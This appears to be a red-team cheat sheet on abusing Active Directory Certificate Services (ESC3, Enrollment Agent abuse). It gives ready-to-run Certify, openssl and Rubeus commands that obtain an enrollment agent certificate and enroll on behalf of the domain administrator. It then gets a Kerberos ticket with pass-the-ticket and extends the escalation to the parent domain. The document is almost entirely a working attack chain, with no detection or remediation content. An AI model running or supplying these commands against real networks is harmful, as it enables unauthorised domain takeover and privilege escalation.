# ADCS ESC3 (Enrollment Agent Abuse)

Two-template chain: request an Enrollment Agent cert (EKU: Certificate Request Agent), then use it to enroll on behalf of any user in a template requiring that application policy.

## Step 1: Identify Templates
```
Certify.exe find /vulnerable
```
Look for:
- Template A: EKU = `Certificate Request Agent`, enrollment rights for Domain Users → **Enrollment Agent template**
- Template B: `Authorized Signatures Required: 1`, Application Policy = `Certificate Request Agent`, EKU includes `Client Authentication` → **Target template**

## Step 2: Get Enrollment Agent Certificate
```
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<ENROLLMENT_AGENT_TEMPLATE>
```
Save to `esc3.pem` → convert to PFX:
```
openssl pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc3-agent.pfx
```

## Step 3: Enroll on Behalf of DA
```
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TARGET_TEMPLATE> /onbehalfof:<domain>\administrator /enrollcert:esc3-agent.pfx /enrollcertpw:SecretPass@123
```
Save to `esc3-DA.pem` → convert:
```
openssl pkcs12 -in esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc3-DA.pfx
```

## Step 4: Request TGT
```
Loader.exe -path Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
```

## EA Escalation
Change `/onbehalfof` to `<PARENT_DOMAIN>\administrator` and use `/dc:<PARENT_DC>` in Rubeus asktgt.
